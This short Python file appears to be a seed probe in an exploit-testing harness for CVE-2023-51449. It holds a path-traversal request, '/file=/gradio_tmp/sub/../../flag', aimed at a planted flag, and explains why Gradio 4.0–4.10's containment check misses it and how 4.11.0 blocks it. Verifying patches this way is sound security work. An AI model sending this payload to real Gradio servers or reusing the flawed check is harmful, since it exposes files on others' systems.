#!/usr/bin/env python3
"""[GIVEN] CVE-2023-51449 seed exploit — /file temp-dir containment bypass via
a subdirectory + `../` traversal.

Gradio's `/file=` route allows any path contained in an allowed directory, using
gradio.utils.is_in_or_equal(). In gradio 4.0-4.10 that check was
`str(path.relative_to(allowed)).startswith("..")`. Because the request goes
through an *uploaded* subdirectory first (`/gradio_tmp/sub/...`), the relative
path is `sub/../../flag`, which starts with the subdir name `sub`, NOT with
`..` — so the check passes and the `../` escapes the allowed dir (Horizon3:
"the check ... doesn't account for subdirectories inside the temp folder").

Contract: reaches the planted flag at /flag on V0 (gradio 4.10.0); BLOCKED on V1
(gradio 4.11.0), whose CVE-2023-51449 fix changed the guard to `".." in str(rel)`,
catching the literal `..` anywhere in the relative path.
"""
from __future__ import annotations

# /gradio_tmp is the app's allowed_paths dir; /gradio_tmp/sub is an (uploaded) subdir.
# sub/../../flag  ->  filesystem root /flag (one level above /gradio_tmp).
PATH = "/file=/gradio_tmp/sub/../../flag"


def candidate() -> dict:
    return {"probe_id": "cve-2023-51449-subdir-dotdot", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
